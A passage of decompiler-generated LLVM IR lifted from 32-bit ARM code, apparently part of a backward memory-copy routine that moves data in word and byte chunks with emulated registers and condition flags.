  %v7_182e8 = add i32 %v0_182e8, -12
  %v8_182e8 = inttoptr i32 %v7_182e8 to i32*
  %v9_182e8 = load i32, i32* %v8_182e8, align 4
  store i32 %v9_182e8, i32* %ip.global-to-local, align 4
  %v10_182e8 = add i32 %v0_182e8, -16
  %v11_182e8 = inttoptr i32 %v10_182e8 to i32*
  %v12_182e8 = load i32, i32* %v11_182e8, align 4
  store i32 %v12_182e8, i32* %lr.global-to-local, align 4
  store i32 %v10_182e8, i32* %r1.global-to-local, align 4
  %v1_182ec = add i32 %v0_182ec, -16
  %v2_182ec = inttoptr i32 %v1_182ec to i32*
  store i32 %v3_182e8, i32* %v2_182ec, align 4
  %v4_182ec = add i32 %v0_182ec, -12
  %v5_182ec = inttoptr i32 %v4_182ec to i32*
  %v6_182ec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_182ec, i32* %v5_182ec, align 4
  %v7_182ec = add i32 %v0_182ec, -8
  %v8_182ec = inttoptr i32 %v7_182ec to i32*
  %v9_182ec = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_182ec, i32* %v8_182ec, align 4
  %v10_182ec = add i32 %v0_182ec, -4
  %v11_182ec = inttoptr i32 %v10_182ec to i32*
  %v12_182ec = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_182ec, i32* %v11_182ec, align 4
  store i32 %v1_182ec, i32* %r0.global-to-local, align 4
  %v0_182f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_182f0 = add i32 %v0_182f0, -4
  %v2_182f0 = inttoptr i32 %v1_182f0 to i32*
  %v3_182f0 = load i32, i32* %v2_182f0, align 4
  store i32 %v3_182f0, i32* @r3, align 4
  %v4_182f0 = add i32 %v0_182f0, -8
  %v5_182f0 = inttoptr i32 %v4_182f0 to i32*
  %v6_182f0 = load i32, i32* %v5_182f0, align 4
  store i32 %v6_182f0, i32* %r4.global-to-local, align 4
  %v7_182f0 = add i32 %v0_182f0, -12
  %v8_182f0 = inttoptr i32 %v7_182f0 to i32*
  %v9_182f0 = load i32, i32* %v8_182f0, align 4
  store i32 %v9_182f0, i32* @ip, align 4
  %v10_182f0 = add i32 %v0_182f0, -16
  %v11_182f0 = inttoptr i32 %v10_182f0 to i32*
  %v12_182f0 = load i32, i32* %v11_182f0, align 4
  store i32 %v12_182f0, i32* %lr.global-to-local, align 4
  store i32 %v10_182f0, i32* %r1.global-to-local, align 4
  %v1_182f4 = add i32 %v0_182ec, -32
  %v2_182f4 = inttoptr i32 %v1_182f4 to i32*
  store i32 %v3_182f0, i32* %v2_182f4, align 4
  %v4_182f4 = add i32 %v0_182ec, -28
  %v5_182f4 = inttoptr i32 %v4_182f4 to i32*
  %v6_182f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_182f4, i32* %v5_182f4, align 4
  %v7_182f4 = add i32 %v0_182ec, -24
  %v8_182f4 = inttoptr i32 %v7_182f4 to i32*
  %v9_182f4 = load i32, i32* @ip, align 4
  store i32 %v9_182f4, i32* %v8_182f4, align 4
  %v10_182f4 = add i32 %v0_182ec, -20
  %v11_182f4 = inttoptr i32 %v10_182f4 to i32*
  %v12_182f4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_182f4, i32* %v11_182f4, align 4
  store i32 %v1_182f4, i32* %r0.global-to-local, align 4
  %v0_182f8 = load i32, i32* %r2.global-to-local, align 4
  %v2_182f8 = add i32 %v0_182f8, -32
  store i32 %v2_182f8, i32* %r2.global-to-local, align 4
  %v6_182fc = icmp slt i32 %v0_182f8, 32
  br i1 %v6_182fc, label %dec_label_pc_18300.loopexit, label %dec_label_pc_182e8.dec_label_pc_182e8_crit_edge

dec_label_pc_182e8.dec_label_pc_182e8_crit_edge:  ; preds = %dec_label_pc_182e8
  %v0_182e8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_182e8

dec_label_pc_18300.loopexit:                      ; preds = %dec_label_pc_182e8
  %v4_182f8 = sub i32 31, %v0_182f8
  %v5_182f8 = and i32 %v4_182f8, %v0_182f8
  %v6_182f8 = icmp slt i32 %v5_182f8, 0
  %v7_182f8 = icmp slt i32 %v2_182f8, 0
  store i1 %v6_182f8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_182f8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18300

dec_label_pc_18300:                               ; preds = %dec_label_pc_18300.loopexit, %dec_label_pc_182dc
  %v6_18308 = phi i32 [ %v1_182f4, %dec_label_pc_18300.loopexit ], [ %v0_182ec37, %dec_label_pc_182dc ]
  %v0_18310.pr = phi i32 [ %v2_182f8, %dec_label_pc_18300.loopexit ], [ %v2_182e0, %dec_label_pc_182dc ]
  %v4_18300 = add i32 %v0_18310.pr, 16
  %v6_18300 = sub i32 0, %v0_18310.pr
  %v7_18300 = and i32 %v4_18300, %v6_18300
  %v8_18300 = icmp slt i32 %v7_18300, 0
  store i1 %v8_18300, i1* %cpsr_v.global-to-local, align 1
  %v9_18300 = icmp slt i32 %v4_18300, 0
  store i1 %v9_18300, i1* %cpsr_n.global-to-local, align 1
  %v10_18300 = icmp eq i32 %v4_18300, 0
  store i1 %v10_18300, i1* %cpsr_z.global-to-local, align 1
  %v5_18304 = icmp slt i32 %v0_18310.pr, -16
  br i1 %v5_18304, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_18300
  %v6_18304 = load i32, i32* %r1.global-to-local, align 4
  %v7_18304 = add i32 %v6_18304, -4
  %v8_18304 = inttoptr i32 %v7_18304 to i32*
  %v9_18304 = load i32, i32* %v8_18304, align 4
  store i32 %v9_18304, i32* @r3, align 4
  %v10_18304 = add i32 %v6_18304, -8
  %v11_18304 = inttoptr i32 %v10_18304 to i32*
  %v12_18304 = load i32, i32* %v11_18304, align 4
  store i32 %v12_18304, i32* %r4.global-to-local, align 4
  %v13_18304 = add i32 %v6_18304, -12
  %v14_18304 = inttoptr i32 %v13_18304 to i32*
  %v15_18304 = load i32, i32* %v14_18304, align 4
  store i32 %v15_18304, i32* @ip, align 4
  %v16_18304 = add i32 %v6_18304, -16
  %v17_18304 = inttoptr i32 %v16_18304 to i32*
  %v18_18304 = load i32, i32* %v17_18304, align 4
  store i32 %v18_18304, i32* %lr.global-to-local, align 4
  store i32 %v16_18304, i32* %r1.global-to-local, align 4
  %v7_18308 = add i32 %v6_18308, -16
  %v8_18308 = inttoptr i32 %v7_18308 to i32*
  store i32 %v9_18304, i32* %v8_18308, align 4
  %v10_18308 = add i32 %v6_18308, -12
  %v11_18308 = inttoptr i32 %v10_18308 to i32*
  %v12_18308 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_18308, i32* %v11_18308, align 4
  %v13_18308 = add i32 %v6_18308, -8
  %v14_18308 = inttoptr i32 %v13_18308 to i32*
  %v15_18308 = load i32, i32* @ip, align 4
  store i32 %v15_18308, i32* %v14_18308, align 4
  %v16_18308 = add i32 %v6_18308, -4
  %v17_18308 = inttoptr i32 %v16_18308 to i32*
  %v18_18308 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_18308, i32* %v17_18308, align 4
  store i32 %v7_18308, i32* %r0.global-to-local, align 4
  %v6_1830c = load i32, i32* %r2.global-to-local, align 4
  %v7_1830c = add i32 %v6_1830c, -16
  store i32 %v7_1830c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18300, %bb147
  %v6_18318 = phi i32 [ %v7_18308, %bb147 ], [ %v6_18308, %dec_label_pc_18300 ]
  %v0_18310 = phi i32 [ %v7_1830c, %bb147 ], [ %v0_18310.pr, %dec_label_pc_18300 ]
  %v4_18310 = add i32 %v0_18310, 20
  store i32 %v4_18310, i32* %r2.global-to-local, align 4
  %v6_18310 = sub i32 0, %v0_18310
  %v7_18310 = and i32 %v4_18310, %v6_18310
  %v8_18310 = icmp slt i32 %v7_18310, 0
  store i1 %v8_18310, i1* %cpsr_v.global-to-local, align 1
  %v9_18310 = icmp slt i32 %v4_18310, 0
  store i1 %v9_18310, i1* %cpsr_n.global-to-local, align 1
  %v10_18310 = icmp eq i32 %v4_18310, 0
  store i1 %v10_18310, i1* %cpsr_z.global-to-local, align 1
  %v5_18314 = icmp slt i32 %v0_18310, -20
  br i1 %v5_18314, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_18314 = load i32, i32* %r1.global-to-local, align 4
  %v7_18314 = add i32 %v6_18314, -4
  %v8_18314 = inttoptr i32 %v7_18314 to i32*
  %v9_18314 = load i32, i32* %v8_18314, align 4
  store i32 %v9_18314, i32* @r3, align 4
  %v10_18314 = add i32 %v6_18314, -8
  %v11_18314 = inttoptr i32 %v10_18314 to i32*
  %v12_18314 = load i32, i32* %v11_18314, align 4
  store i32 %v12_18314, i32* @ip, align 4
  %v13_18314 = add i32 %v6_18314, -12
  %v14_18314 = inttoptr i32 %v13_18314 to i32*
  %v15_18314 = load i32, i32* %v14_18314, align 4
  store i32 %v15_18314, i32* %lr.global-to-local, align 4
  store i32 %v13_18314, i32* %r1.global-to-local, align 4
  %v7_18318 = add i32 %v6_18318, -12
  %v8_18318 = inttoptr i32 %v7_18318 to i32*
  store i32 %v9_18314, i32* %v8_18318, align 4
  %v10_18318 = add i32 %v6_18318, -8
  %v11_18318 = inttoptr i32 %v10_18318 to i32*
  %v12_18318 = load i32, i32* @ip, align 4
  store i32 %v12_18318, i32* %v11_18318, align 4
  %v13_18318 = add i32 %v6_18318, -4
  %v14_18318 = inttoptr i32 %v13_18318 to i32*
  %v15_18318 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_18318, i32* %v14_18318, align 4
  store i32 %v7_18318, i32* %r0.global-to-local, align 4
  %v6_1831c = load i32, i32* %r2.global-to-local, align 4
  %v7_1831c = add i32 %v6_1831c, -12
  store i32 %v7_1831c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_1833c45 = phi i32 [ %v6_18318, %.thread2 ], [ %v7_18318, %bb148 ]
  %v0_1832443 = phi i32 [ %v4_18310, %.thread2 ], [ %v7_1831c, %bb148 ]
  %v2_18320 = load i8*, i8** %stack_var_-8, align 4
  %v3_18320 = ptrtoint i8* %v2_18320 to i32
  store i32 %v3_18320, i32* @r4, align 4
  store i32 %v8_182dc, i32* @lr, align 4
  br label %dec_label_pc_18324

dec_label_pc_18324:                               ; preds = %dec_label_pc_182d4, %.thread4
  %v7_18334 = phi i32 [ %v0_182ec37, %dec_label_pc_182d4 ], [ %v6_1833c45, %.thread4 ]
  %v0_18324 = phi i32 [ %v2_182d4, %dec_label_pc_182d4 ], [ %v0_1832443, %.thread4 ]
  %v2_18324 = add i32 %v0_18324, 8
  store i32 %v2_18324, i32* %r2.global-to-local, align 4
  %v4_18324 = sub i32 0, %v0_18324
  %v5_18324 = and i32 %v2_18324, %v4_18324
  %v6_18324 = icmp slt i32 %v5_18324, 0
  store i1 %v6_18324, i1* %cpsr_v.global-to-local, align 1
  %v7_18324 = icmp slt i32 %v2_18324, 0
  store i1 %v7_18324, i1* %cpsr_n.global-to-local, align 1
  %v8_18324 = icmp eq i32 %v2_18324, 0
  store i1 %v8_18324, i1* %cpsr_z.global-to-local, align 1
  %v5_18328 = icmp slt i32 %v0_18324, -8
  br i1 %v5_18328, label %bb150, label %dec_label_pc_1832c

dec_label_pc_1832c:                               ; preds = %dec_label_pc_18324
  %v6_1832c = add i32 %v0_18324, 4
  store i32 %v6_1832c, i32* %r2.global-to-local, align 4
  %v8_1832c = sub i32 -5, %v0_18324
  %v9_1832c = and i32 %v8_1832c, %v2_18324
  %v10_1832c = icmp slt i32 %v9_1832c, 0
  store i1 %v10_1832c, i1* %cpsr_v.global-to-local, align 1
  %v11_1832c = icmp slt i32 %v6_1832c, 0
  store i1 %v11_1832c, i1* %cpsr_n.global-to-local, align 1
  %v12_1832c = icmp eq i32 %v2_18324, 4
  store i1 %v12_1832c, i1* %cpsr_z.global-to-local, align 1
  %v5_18330 = icmp slt i32 %v2_18324, 4
  %v6_18330 = load i32, i32* %r1.global-to-local, align 4
  %v7_18330 = add i32 %v6_18330, -4
  %v8_18330 = inttoptr i32 %v7_18330 to i32*
  %v9_18330 = load i32, i32* %v8_18330, align 4
  store i32 %v9_18330, i32* @r3, align 4
  br i1 %v5_18330, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_1832c
  store i32 %v7_18330, i32* %r1.global-to-local, align 4
  %v8_18334 = add i32 %v7_18334, -4
  %v9_18334 = inttoptr i32 %v8_18334 to i32*
  store i32 %v9_18330, i32* %v9_18334, align 4
  %v10_18334 = load i32, i32* %r0.global-to-local, align 4
  %v11_18334 = add i32 %v10_18334, -4
  store i32 %v11_18334, i32* %r0.global-to-local, align 4
  %v0_18344.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_1832c
  %v10_18338 = add i32 %v6_18330, -8
  %v11_18338 = inttoptr i32 %v10_18338 to i32*
  %v12_18338 = load i32, i32* %v11_18338, align 4
  store i32 %v12_18338, i32* @ip, align 4
  store i32 %v10_18338, i32* %r1.global-to-local, align 4
  %v7_1833c = add i32 %v7_18334, -8
  %v8_1833c = inttoptr i32 %v7_1833c to i32*
  store i32 %v9_18330, i32* %v8_1833c, align 4
  %v10_1833c = add i32 %v7_18334, -4
  %v11_1833c = inttoptr i32 %v10_1833c to i32*
  %v12_1833c = load i32, i32* @ip, align 4
  store i32 %v12_1833c, i32* %v11_1833c, align 4
  store i32 %v7_1833c, i32* %r0.global-to-local, align 4
  %v6_18340 = load i32, i32* %r2.global-to-local, align 4
  %v7_18340 = add i32 %v6_18340, -4
  store i32 %v7_18340, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_18324, %dec_label_pc_182b4, %dec_label_pc_184e8, %dec_label_pc_1847c, %dec_label_pc_18410, %bb149
  %v2_18348 = phi i32 [ %v11_18334, %.thread8 ], [ %v0_183e020, %.thread14 ], [ %v7_18334, %dec_label_pc_18324 ], [ %v2_182b8, %dec_label_pc_182b4 ], [ %v2_1835453, %dec_label_pc_184e8 ], [ %v2_1835452, %dec_label_pc_1847c ], [ %v2_1835451, %dec_label_pc_18410 ], [ %v7_1833c, %bb149 ]
  %v0_18344 = phi i32 [ %v0_18344.pre, %.thread8 ], [ %v2_18388, %.thread14 ], [ %v2_18324, %dec_label_pc_18324 ], [ %v2_182bc, %dec_label_pc_182b4 ], [ %v0_1834449, %dec_label_pc_184e8 ], [ %v0_1834448, %dec_label_pc_1847c ], [ %v0_1834447, %dec_label_pc_18410 ], [ %v7_18340, %bb149 ]
  %v1_18344 = add i32 %v0_18344, 4
  store i32 %v1_18344, i32* %r2.global-to-local, align 4
  %v3_18344 = sub i32 0, %v0_18344
  %v4_18344 = and i32 %v1_18344, %v3_18344
  %v5_18344 = icmp slt i32 %v4_18344, 0
  store i1 %v5_18344, i1* %cpsr_v.global-to-local, align 1
  %v6_18344 = icmp slt i32 %v1_18344, 0
  store i1 %v6_18344, i1* %cpsr_n.global-to-local, align 1
  %v7_18344 = icmp eq i32 %v1_18344, 0
  store i1 %v7_18344, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18344, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_1834c = add i32 %v0_18344, 2
  %v3_1834c = sub i32 -3, %v0_18344
  %v4_1834c = and i32 %v3_1834c, %v1_18344
  %v5_1834c = icmp slt i32 %v4_1834c, 0
  store i1 %v5_1834c, i1* %cpsr_v.global-to-local, align 1
  %v6_1834c = icmp slt i32 %v1_1834c, 0
  store i1 %v6_1834c, i1* %cpsr_n.global-to-local, align 1
  %v7_1834c = icmp eq i32 %v1_18344, 2
  store i1 %v7_1834c, i1* %cpsr_z.global-to-local, align 1
  %v0_18350 = load i32, i32* %r1.global-to-local, align 4
  %v1_18350 = add i32 %v0_18350, -1
  %v2_18350 = inttoptr i32 %v1_18350 to i8*
  %v3_18350 = load i8, i8* %v2_18350, align 1
  %v4_18350 = zext i8 %v3_18350 to i32
  store i32 %v4_18350, i32* @r3, align 4
  store i32 %v1_18350, i32* %r1.global-to-local, align 4
  %v3_18354 = add i32 %v2_18348, -1
  %v4_18354 = inttoptr i32 %v3_18354 to i8*
  store i8 %v3_18350, i8* %v4_18354, align 1
  %v5_18354 = load i32, i32* %r0.global-to-local, align 4
  %v6_18354 = add i32 %v5_18354, -1
  store i32 %v6_18354, i32* %r0.global-to-local, align 4
  %v0_18358 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_18358 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_18358 = xor i1 %v0_18358, %v1_18358
  br i1 %v2_18358, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_18358 = load i32, i32* %r1.global-to-local, align 4
  %v4_18358 = add i32 %v3_18358, -1
  %v5_18358 = inttoptr i32 %v4_18358 to i8*
  %v6_18358 = load i8, i8* %v5_18358, align 1
  %v7_18358 = zext i8 %v6_18358 to i32
  store i32 %v7_18358, i32* @r3, align 4
  store i32 %v4_18358, i32* %r1.global-to-local, align 4
  %v6_1835c = add i32 %v5_18354, -2
  %v7_1835c = inttoptr i32 %v6_1835c to i8*
  store i8 %v6_18358, i8* %v7_1835c, align 1
  %v8_1835c = load i32, i32* %r0.global-to-local, align 4
  %v9_1835c = add i32 %v8_1835c, -1
  store i32 %v9_1835c, i32* %r0.global-to-local, align 4
  %v1_18360.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_18360.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_18364 = phi i32 [ %v9_1835c, %bb152 ], [ %v6_18354, %bb151 ]
  %v2_18364 = phi i1 [ %v2_18360.pre, %bb152 ], [ %v1_18358, %bb151 ]
  %v1_18364 = phi i1 [ %v1_18360.pre, %bb152 ], [ %v0_18358, %bb151 ]
  %v0_18360 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_18360 = xor i1 %v2_18364, %v1_18364
  %v4_18360 = or i1 %v0_18360, %v3_18360
  br i1 %v4_18360, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_18360 = load i32, i32* %r1.global-to-local, align 4
  %v6_18360 = add i32 %v5_18360, -1
  %v7_18360 = inttoptr i32 %v6_18360 to i8*
  %v8_18360 = load i8, i8* %v7_18360, align 1
  %v9_18360 = zext i8 %v8_18360 to i32
  store i32 %v9_18360, i32* @r3, align 4
  store i32 %v6_18360, i32* %r1.global-to-local, align 4
  %v8_18364 = add i32 %v7_18364, -1
  %v9_18364 = inttoptr i32 %v8_18364 to i8*
  store i8 %v8_18360, i8* %v9_18364, align 1
  %v10_18364 = load i32, i32* %r0.global-to-local, align 4
  %v11_18364 = add i32 %v10_18364, -1
  store i32 %v11_18364, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_1836c:                               ; preds = %dec_label_pc_182c4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_1836c = icmp eq i32 %v1_182c4, 1
  store i1 %v8_1836c, i1* %cpsr_n.global-to-local, align 1
  %v9_1836c = icmp eq i32 %v1_182c4, 2
  store i1 %v9_1836c, i1* %cpsr_z.global-to-local, align 1
  %v1_18370 = add i32 %v2_182b4, -1
  %v2_18370 = inttoptr i32 %v1_18370 to i8*
  %v3_18370 = load i8, i8* %v2_18370, align 1
  %v4_18370 = zext i8 %v3_18370 to i32
  store i32 %v4_18370, i32* @r3, align 4
  store i32 %v1_18370, i32* %r1.global-to-local, align 4
  %v3_18374 = add i32 %v2_182b8, -1
  %v4_18374 = inttoptr i32 %v3_18374 to i8*
  store i8 %v3_18370, i8* %v4_18374, align 1
  %v5_18374 = load i32, i32* %r0.global-to-local, align 4
  %v6_18374 = add i32 %v5_18374, -1
  store i32 %v6_18374, i32* %r0.global-to-local, align 4
  br i1 %v8_1836c, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_1836c
  %v6_18378 = load i32, i32* %r1.global-to-local, align 4
  %v7_18378 = add i32 %v6_18378, -1
  %v8_18378 = inttoptr i32 %v7_18378 to i8*
  %v9_18378 = load i8, i8* %v8_18378, align 1
  %v10_18378 = zext i8 %v9_18378 to i32
  store i32 %v10_18378, i32* @r3, align 4
  store i32 %v7_18378, i32* %r1.global-to-local, align 4
  %v9_1837c = add i32 %v5_18374, -2
  %v10_1837c = inttoptr i32 %v9_1837c to i8*
  store i8 %v9_18378, i8* %v10_1837c, align 1
  %v11_1837c = load i32, i32* %r0.global-to-local, align 4
  %v12_1837c = add i32 %v11_1837c, -1
  store i32 %v12_1837c, i32* %r0.global-to-local, align 4
  br i1 %v9_1836c, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_18380 = load i32, i32* %r1.global-to-local, align 4
  %v9_18380 = add i32 %v8_18380, -1
  %v10_18380 = inttoptr i32 %v9_18380 to i8*
  %v11_18380 = load i8, i8* %v10_18380, align 1
  %v12_18380 = zext i8 %v11_18380 to i32
  store i32 %v12_18380, i32* @r3, align 4
  store i32 %v9_18380, i32* %r1.global-to-local, align 4
  %v11_18384 = add i32 %v11_1837c, -2
  %v12_18384 = inttoptr i32 %v11_18384 to i8*
  store i8 %v11_18380, i8* %v12_18384, align 1
  %v13_18384 = load i32, i32* %r0.global-to-local, align 4
  %v14_18384 = add i32 %v13_18384, -1
  store i32 %v14_18384, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_1836c, %bb155
  %v0_183e020 = phi i32 [ %v12_1837c, %bb154 ], [ %v6_18374, %dec_label_pc_1836c ], [ %v14_18384, %bb155 ]
  %v0_18388 = load i32, i32* %r2.global-to-local, align 4
  %v1_18388 = load i32, i32* @ip, align 4
  %v2_18388 = sub i32 %v0_18388, %v1_18388
  store i32 %v2_18388, i32* %r2.global-to-local, align 4
  %v4_18388 = xor i32 %v1_18388, %v0_18388
  %v5_18388 = xor i32 %v2_18388, %v0_18388
  %v6_18388 = and i32 %v5_18388, %v4_18388
  %v7_18388 = icmp slt i32 %v6_18388, 0
  store i1 %v7_18388, i1* %cpsr_v.global-to-local, align 1
  %v8_18388 = icmp slt i32 %v2_18388, 0
  store i1 %v8_18388, i1* %cpsr_n.global-to-local, align 1
  %v9_18388 = icmp eq i32 %v0_18388, %v1_18388
  store i1 %v9_18388, i1* %cpsr_z.global-to-local, align 1
  %v5_1838c = icmp slt i32 %v0_18388, %v1_18388
  br i1 %v5_1838c, label %bb150, label %dec_label_pc_18390

dec_label_pc_18390:                               ; preds = %.thread14
  %v0_18390 = load i32, i32* %r1.global-to-local, align 4
  %v1_18390 = urem i32 %v0_18390, 4
  store i32 %v1_18390, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18390 = icmp eq i32 %v1_18390, 0
  store i1 %v2_18390, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18390, label %dec_label_pc_182d4, label %dec_label_pc_18398

dec_label_pc_18398:                               ; preds = %dec_label_pc_182cc, %dec_label_pc_18390
  %v0_183e019 = phi i32 [ %v2_182b8, %dec_label_pc_182cc ], [ %v0_183e020, %dec_label_pc_18390 ]
  %v0_1848c = phi i32 [ %v2_182bc, %dec_label_pc_182cc ], [ %v2_18388, %dec_label_pc_18390 ]
  %v0_18398 = phi i32 [ %v2_182b4, %dec_label_pc_182cc ], [ %v0_18390, %dec_label_pc_18390 ]
  %v0_183a0 = phi i32 [ %v1_182cc, %dec_label_pc_182cc ], [ %v1_18390, %dec_label_pc_18390 ]
  %v1_18398 = and i32 %v0_18398, -4
  store i32 %v1_18398, i32* %r1.global-to-local, align 4
  %v1_1839c = inttoptr i32 %v1_18398 to i32*
  %v2_1839c = load i32, i32* %v1_1839c, align 4
  store i32 %v2_1839c, i32* @r3, align 4
  %v7_183a0 = icmp ult i32 %v0_183a0, 2
  %v2_18484 = add i32 %v0_1848c, -12
  %v4_18484 = sub i32 11, %v0_1848c
  %v5_18484 = and i32 %v4_18484, %v0_1848c
  %v6_18484 = icmp slt i32 %v5_18484, 0
  store i1 %v6_18484, i1* %cpsr_v.global-to-local, align 1
  %v7_18484 = icmp slt i32 %v2_18484, 0
  store i1 %v7_18484, i1* %cpsr_n.global-to-local, align 1
  %v8_18484 = icmp eq i32 %v0_1848c, 12
  store i1 %v8_18484, i1* %cpsr_z.global-to-local, align 1
  %v5_18488 = icmp slt i32 %v0_1848c, 12
  br i1 %v7_183a0, label %dec_label_pc_18484, label %dec_label_pc_183a8

dec_label_pc_183a8:                               ; preds = %dec_label_pc_18398
  %v8_183a0 = icmp eq i32 %v0_183a0, 2
  br i1 %v8_183a0, label %dec_label_pc_18418, label %dec_label_pc_183ac

dec_label_pc_183ac:                               ; preds = %dec_label_pc_183a8
  br i1 %v5_18488, label %dec_label_pc_183f8, label %dec_label_pc_183b4

dec_label_pc_183b4:                               ; preds = %dec_label_pc_183ac
  store i32 %v2_18484, i32* %r2.global-to-local, align 4
  %v3_183b8 = load i32, i32* @r4, align 4
  store i32 %v3_183b8, i32* %stack_var_-12, align 4
  %v6_183b8 = load i32, i32* @r5, align 4
  %v8_183b8 = inttoptr i32 %v6_183b8 to i8*
  store i8* %v8_183b8, i8** %stack_var_-8, align 4
  %v11_183b8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_183bc

dec_label_pc_183bc:                               ; preds = %dec_label_pc_183bc.dec_label_pc_183bc_crit_edge, %dec_label_pc_183b4
  %v0_183e0 = phi i32 [ %v1_183e0, %dec_label_pc_183bc.dec_label_pc_183bc_crit_edge ], [ %v0_183e019, %dec_label_pc_183b4 ]
  %v0_183c0 = phi i32 [ %v0_183c0.pre, %dec_label_pc_183bc.dec_label_pc_183bc_crit_edge ], [ %v1_18398, %dec_label_pc_183b4 ]
  %v0_183bc = phi i32 [ %v0_183bc.pre, %dec_label_pc_183bc.dec_label_pc_183bc_crit_edge ], [ %v2_1839c, %dec_label_pc_183b4 ]
  %v3_183bc = mul i32 %v0_183bc, 256
  store i32 %v3_183bc, i32* %lr.global-to-local, align 4
  %v1_183c0 = add i32 %v0_183c0, -4
  %v2_183c0 = inttoptr i32 %v1_183c0 to i32*
  %v3_183c0 = load i32, i32* %v2_183c0, align 4
  store i32 %v3_183c0, i32* @r3, align 4
  %v4_183c0 = add i32 %v0_183c0, -8
  %v5_183c0 = inttoptr i32 %v4_183c0 to i32*
  %v6_183c0 = load i32, i32* %v5_183c0, align 4
  store i32 %v6_183c0, i32* %r4.global-to-local, align 4
  %v7_183c0 = add i32 %v0_183c0, -12
  %v8_183c0 = inttoptr i32 %v7_183c0 to i32*
  %v9_183c0 = load i32, i32* %v8_183c0, align 4
  store i32 %v9_183c0, i32* %r5.global-to-local, align 4
  %v10_183c0 = add i32 %v0_183c0, -16
  %v11_183c0 = inttoptr i32 %v10_183c0 to i32*
  %v12_183c0 = load i32, i32* %v11_183c0, align 4
  store i32 %v10_183c0, i32* %r1.global-to-local, align 4
  %v4_183c4 = udiv i32 %v12_183c0, 16777216
  %v5_183c4 = or i32 %v4_183c4, %v3_183bc
  store i32 %v5_183c4, i32* %lr.global-to-local, align 4
  %v3_183c8 = mul i32 %v12_183c0, 256
  %v4_183cc = udiv i32 %v9_183c0, 16777216
  %v5_183cc = or i32 %v3_183c8, %v4_183cc
  store i32 %v5_183cc, i32* @ip, align 4
  %v3_183d0 = mul i32 %v9_183c0, 256
  %v4_183d4 = udiv i32 %v6_183c0, 16777216
  %v5_183d4 = or i32 %v3_183d0, %v4_183d4
  store i32 %v5_183d4, i32* %r5.global-to-local, align 4
  %v3_183d8 = mul i32 %v6_183c0, 256
  %v4_183dc = udiv i32 %v3_183c0, 16777216
  %v5_183dc = or i32 %v3_183d8, %v4_183dc
  store i32 %v5_183dc, i32* %r4.global-to-local, align 4
  %v1_183e0 = add i32 %v0_183e0, -16
  %v2_183e0 = inttoptr i32 %v1_183e0 to i32*
  store i32 %v5_183dc, i32* %v2_183e0, align 4
  %v4_183e0 = add i32 %v0_183e0, -12
  %v5_183e0 = inttoptr i32 %v4_183e0 to i32*
  %v6_183e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_183e0, i32* %v5_183e0, align 4
  %v7_183e0 = add i32 %v0_183e0, -8
  %v8_183e0 = inttoptr i32 %v7_183e0 to i32*
  %v9_183e0 = load i32, i32* @ip, align 4
  store i32 %v9_183e0, i32* %v8_183e0, align 4
  %v10_183e0 = add i32 %v0_183e0, -4
  %v11_183e0 = inttoptr i32 %v10_183e0 to i32*
  %v12_183e0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_183e0, i32* %v11_183e0, align 4
  store i32 %v1_183e0, i32* %r0.global-to-local, align 4
  %v0_183e4 = load i32, i32* %r2.global-to-local, align 4
  %v2_183e4 = add i32 %v0_183e4, -16
  store i32 %v2_183e4, i32* %r2.global-to-local, align 4
  %v6_183e8 = icmp slt i32 %v0_183e4, 16
  br i1 %v6_183e8, label %dec_label_pc_183ec, label %dec_label_pc_183bc.dec_label_pc_183bc_crit_edge

dec_label_pc_183bc.dec_label_pc_183bc_crit_edge:  ; preds = %dec_label_pc_183bc
  %v0_183bc.pre = load i32, i32* @r3, align 4
  %v0_183c0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_183bc

dec_label_pc_183ec:                               ; preds = %dec_label_pc_183bc
  %v2_183ec = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_183ec, i32* @r4, align 4
  %v5_183ec = load i8*, i8** %stack_var_-8, align 4
  %v6_183ec = ptrtoint i8* %v5_183ec to i32
